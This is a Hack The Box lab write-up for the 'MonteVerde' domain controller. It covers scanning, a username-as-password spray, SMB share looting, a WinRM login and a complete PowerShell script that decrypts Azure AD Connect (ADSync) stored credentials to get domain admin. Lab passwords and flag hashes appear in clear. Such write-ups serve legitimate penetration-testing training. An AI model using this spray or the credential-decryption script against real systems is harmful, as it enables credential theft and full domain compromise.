+++
title = "HTB - MonteVerde"
date = 2024-12-24
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.172
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 11:14 EST
Stats: 0:04:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.96% done; ETC: 11:18 (0:00:00 remaining)
Nmap scan report for 10.10.10.172
Host is up (0.11s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-24 16:17:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-24T16:18:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 269.75 seconds
```

### Enumeration
Dealing with a DC.
53 - No Zone Transfer
135 - Anonymous Access -> `ldap 10.10.10.172 -U "" -N`
445 - Auth. Needed

We get users and groups. Query around for information. Clean and put users into a file.
Password spray with usernames as passwords. Simple list idea from 0xdf. Don't overcomplicate
`nxc smb 10.10.10.172 -u user.txt -p user.txt --continue-on-success`
We get a hit for `SABatchJobs:SABatchJobs`. Re-Enumerate SMB: `nxc smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares`
When we connect: `smbclient //10.10.10.172/users$ -U "SABatchJobs"`, there's an Azure xml file in `mhope` directory
We find credentials. `mhope:4n0therD4y@n0th3r$`. 5985 suggests WINRM
`evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`
USER:`15aa3d5e8d85ef52887148171ad8b2c7`

### Privilege Escalation
`whoami /priv` doesn't yield much. `systeminfo` not allowed.
BloodHound Ingester: ``
We find out that we are an Azure Admin
0xdf Azure Explanation... Read up on it as I don't completely understand. CloudLab would be useful.
```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
We run the script and get our credentials. POC wouldn't work, as 0xdf talked about.
`administrator:d0m@in4dminyeah!`
ROOT:`3a0733538506f9ca98cb18f3ec6baf21`